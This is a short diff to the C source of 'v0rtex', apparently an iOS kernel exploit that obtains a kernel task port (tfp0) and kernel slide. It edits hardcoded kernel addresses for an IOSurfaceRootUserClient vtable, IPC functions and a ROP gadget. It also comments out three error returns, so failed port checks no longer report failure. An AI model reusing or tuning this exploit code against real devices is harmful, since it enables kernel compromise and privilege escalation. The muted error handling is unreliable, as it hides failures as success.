@@ -77,10 +77,8 @@
 #define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94 /* convert_task_suspension_token_to_port */
 #define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c /* convert_task_suspension_token_to_port */
 #define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8 /* "ipc_host_init" */
-//#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7a998 // 0xfffffff006e7b9c8 - 0x1030
- #define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8 // 0xfffffff006e7b9c8 + 0x1030
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8 // 0xfffffff006e7b9c8 + 0x1030
 #define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff0064b1398
-
 
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
@@ -333,7 +331,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     }
     if(!MACH_PORT_VALID(client))
     {
-        ret = KERN_FAILURE;
+//        ret = KERN_FAILURE;
         goto out0;
     }
     
@@ -376,7 +374,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     if(!MACH_PORT_VALID(realport))
     {
         LOG("realport: %x", realport);
-        ret = KERN_FAILURE;
+//        ret = KERN_FAILURE;
         goto out1;
     }
     
@@ -402,7 +400,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
     if(!MACH_PORT_VALID(port))
     {
         LOG("port: %x", port);
-        ret = KERN_FAILURE;
+//        ret = KERN_FAILURE;
         goto out2;
     }
     
